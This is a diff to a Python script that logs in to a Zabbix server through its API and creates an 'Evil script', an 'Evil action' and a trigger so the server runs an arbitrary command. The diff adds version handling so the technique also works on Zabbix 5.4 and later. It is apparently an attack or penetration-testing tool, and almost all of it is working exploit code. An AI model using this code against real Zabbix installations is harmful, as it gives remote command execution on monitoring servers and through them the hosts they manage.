@@ -46,22 +46,39 @@ if __name__ == "__main__":
     zapi = pyzabbix.ZabbixAPI(args.url)
     zapi.login(args.username, args.password)
 
-    print("Connected to Zabbix API Version {}".format(zapi.api_version()))
+    version_string = zapi.api_version()
+    version = tuple(map(int, version_string.split(".")))
+
+    print("Connected to Zabbix API Version {}".format(version_string))
 
     try:
         hostid = zapi.host.get(filter={"host": "Host"})[0]["hostid"]
         print("Creating item: Example item")
         zapi.item.create(name="Example item", key_="zabbix[boottime]", hostid=hostid, type=5, interfaceid=1, value_type=0, delay="5s")
 
-        print("Creating action: Evil action")
-        action = zapi.action.create(name="Evil action", status=1, eventsource=0, esc_period="1h", operations=[{"operationtype": 1, "opcommand": {"type": 0, "execute_on": 1, "command": evil_command}, "opcommand_hst": [{"hostid": "0"}]}])
-        action_id = int(action["actionids"][0])
-        action_url = urllib.parse.urljoin(args.url, f"actionconf.php?form=update&actionid={action_id}")
+        if version >= (5,4,0):
+            print("Creating script: Evil script")
+            scriptid = zapi.script.create(name="Evil script", type=0, execute_on=1, command=evil_command)["scriptids"][0]
 
-        print("Creating trigger: Example trigger")
-        trigger = zapi.trigger.create(description="Example trigger", status=1, expression="{Host:zabbix[boottime].last()}={Host:zabbix[boottime].last()}")
-        trigger_id = int(trigger["triggerids"][0])
-        trigger_url = urllib.parse.urljoin(args.url, f"triggers.php?form=update&triggerid={action_id}")
+            print("Creating action: Evil action")
+            action = zapi.action.create(name="Evil action", status=1, eventsource=0, esc_period="1h", operations=[{"operationtype": 1, "opcommand": {"type": 0, "execute_on": 1, "scriptid": scriptid, "command": evil_command}, "opcommand_hst": [{"hostid": "0"}]}])
+            action_id = int(action["actionids"][0])
+            action_url = urllib.parse.urljoin(args.url, f"actionconf.php?form=update&actionid={action_id}")
+
+            print("Creating trigger: Example trigger")
+            trigger = zapi.trigger.create(description="Example trigger", status=1, expression="last(/Host/zabbix[boottime])=last(/Host/zabbix[boottime])")
+            trigger_id = int(trigger["triggerids"][0])
+            trigger_url = urllib.parse.urljoin(args.url, f"triggers.php?form=update&triggerid={action_id}")
+        else:
+            print("Creating action: Evil action")
+            action = zapi.action.create(name="Evil action", status=1, eventsource=0, esc_period="1h", operations=[{"operationtype": 1, "opcommand": {"type": 0, "execute_on": 1, "command": evil_command}, "opcommand_hst": [{"hostid": "0"}]}])
+            action_id = int(action["actionids"][0])
+            action_url = urllib.parse.urljoin(args.url, f"actionconf.php?form=update&actionid={action_id}")
+
+            print("Creating trigger: Example trigger")
+            trigger = zapi.trigger.create(description="Example trigger", status=1, expression="{Host:zabbix[boottime].last()}={Host:zabbix[boottime].last()}")
+            trigger_id = int(trigger["triggerids"][0])
+            trigger_url = urllib.parse.urljoin(args.url, f"triggers.php?form=update&triggerid={action_id}")
     except pyzabbix.ZabbixAPIException as e:
         print(e)
         sys.exit(1)
